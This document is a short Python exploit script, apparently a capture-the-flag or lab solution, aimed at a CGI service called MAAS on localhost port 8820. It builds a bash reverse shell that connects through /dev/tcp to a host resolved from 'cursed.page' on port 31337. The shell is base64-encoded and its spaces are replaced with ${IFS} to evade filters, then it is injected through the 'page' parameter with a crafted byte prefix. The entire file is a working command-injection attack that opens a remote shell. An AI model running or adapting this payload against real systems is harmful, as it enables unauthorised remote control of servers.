import base64
import requests

REV_SHELL = 'bash -i >& /dev/tcp/`getent hosts cursed.page | cut -d" " -f1`/31337 0>&1'
SAFE_REV_SHELL = f'echo {base64.b64encode(REV_SHELL.encode()).decode()} | base64 -d | bash'.replace(' ', '${IFS}')
CGI_READY_REV_SHELL = b'\xca-H' + SAFE_REV_SHELL.encode() + b'; id'

MAAS_HOST = 'localhost'
URL = f'http://{MAAS_HOST}:8820/'

requests.get(URL, params={
	'page': CGI_READY_REV_SHELL,
})